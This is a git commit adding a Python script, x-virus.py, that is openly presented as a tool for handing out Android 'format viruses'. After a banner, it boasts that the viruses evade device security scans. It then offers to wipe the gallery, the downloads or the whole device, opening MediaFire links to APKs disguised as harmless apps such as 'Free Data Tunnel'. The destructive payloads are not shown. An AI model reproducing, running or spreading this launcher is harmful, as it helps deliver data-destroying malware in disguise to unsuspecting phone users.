389e88400413b827ebff29783a67454de14a4d43
KiLL3R_xRO <79046188+KiLL3R-xRO@users.noreply.github.com>
2021-07-31 15:13:04 +0530

    Create x-virus.py

---
+++ x-virus.py
@@ -0,0 +1,161 @@
+import webbrowser
+
+import time
+
+import os
+
+import shutil
+
+os.system('clear')
+
+print ("""'
+
+██╗░░██╗░░░░░░██╗░░░██╗██╗██████╗░██╗░░░██╗░██████╗
+
+╚██╗██╔╝░░░░░░██║░░░██║██║██╔══██╗██║░░░██║██╔════╝
+
+░╚███╔╝░█████╗╚██╗░██╔╝██║██████╔╝██║░░░██║╚█████╗░
+
+░██╔██╗░╚════╝░╚████╔╝░██║██╔══██╗██║░░░██║░╚═══██╗
+
+██╔╝╚██╗░░░░░░░░╚██╔╝░░██║██║░░██║╚██████╔╝██████╔╝
+
+╚═╝░░╚═╝░░░░░░░░░╚═╝░░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░""")
+
+print()
+
+time.sleep(2)
+
+print("\33[104m    >>CREATED BY    : LORD xRO")
+
+time.sleep(2)
+
+print()
+
+print("    >>THANKS  TO    : F SOCIETY")
+
+time.sleep(2)
+
+print()
+
+print("    >>CREDITS TO    :CYBER EXPLOIT UNKNOWNS OFFICIAL\033[0m" )
+
+print()
+
+print()
+
+print("Please Wait,Loading Tool.....")
+
+time.sleep(5)
+
+print()
+
+print("       \033[31mAS ALL THE VIRUSES INCLUDED IN THIS TOOL ARE CREATED BY THE TOOL OWNER,DO NOT RENAME ANY APK FILE OR RESPIRATORY FILE.ALL RIGHTS RESERVED FOR xRO\nNONE OF THE VIRUSES GIVEN IN THIS TOOL GETS DETECTED BY DEVICE SECURITY SCANNING WHILE INSTALLING\033[0m")
+
+print()
+
+print("                              \033[101mSELECT OPTION\033[0m")
+
+print()
+
+print("\033[32m[1]GALLERY FORMAT VIRUS\n[2]DOWNLOADS FORMAT VIRUS\n[3]WHOLE DEVICE FORMAT VIRUS\033[0m")
+
+print()
+
+choice=input("Enter Your Choice |>>")
+
+if choice=="1":
+
+	os.system('clear')	print("\033[35mIMPORTANT NOTE |>>THIS VIRUS ONLY FORMATS DIRECTORY PATHS PICTURES,GALLERY,DCIM,ANDROID AND WHATSAPP.ANY IMAGE OUTSIDE THOSE PATHS OR CREATED BY USER WILL NOT BE DELETED'\033[0m")
+
+	time.sleep(10)
+
+	print()
+
+	print("AFTER 5 SECONDS YOU WILL BE DIRECTED TO DESTINATION PAGE")
+
+	time.sleep(5)
+
+	print("1")
+
+	time.sleep(1)
+
+	print("2")
+
+	time.sleep(1)
+
+	print("3")
+
+	time.sleep(1)
+
+	print("4")
+
+	time.sleep(1)
+
+	print("5")
+
+	time.sleep(1)
+
+	webbrowser.open('https://www.mediafire.com/file/5eu18kgx7j9hoyz/Free+Data+Tunnel_1.0.apk/file')
+
+if choice=="2":
+
+	os.system('clear')
+
+	print("\033[32mPLEASE WAIT FOR 5 SECONDS YOU WILL BE DIRECTED TO DESTINATION PAGE\033[0m")
+
+	time.sleep(5)
+
+	print("1")
+
+	time.sleep(1)
+
+	print("2")
+
+	time.sleep(1)
+
+	print("3")
+
+	time.sleep(1)
+
+	print("4")
+
+	time.sleep(1)
+
+	print("5")
+
+	time.sleep(1)
+
+	webbrowser.open('https://www.mediafire.com/file/gl8jdhdy0biu2xy/Ro-Internet_1.0.apk/file')
+
+if choice=="3":
+
+	os.system('clear')
+
+	print("\033[32mIMPORTANT NOTE |>> THIS OPTION IS STILL UNDER DEVELOPMENT.SO THE OWNER TAKES NO RESPONSIBILITY ABOUT THE FUNCTIONALITY OF THIS APK\033[0m")
+
+	time.sleep(5)
+
+	print("1")
+
+	time.sleep(1)
+
+	print("2")
+
+	time.sleep(1)
+
+	print("3")
+
+	time.sleep(1)
+
+	print("4")
+
+	time.sleep(1)
+
+	print("5")
+
+	time.sleep(1)
+
+	webbrowser.open('https://www.mediafire.com/file/kfi4yvg9n8jvxex/X-Ehi_1.0.apk/file')
+
+	
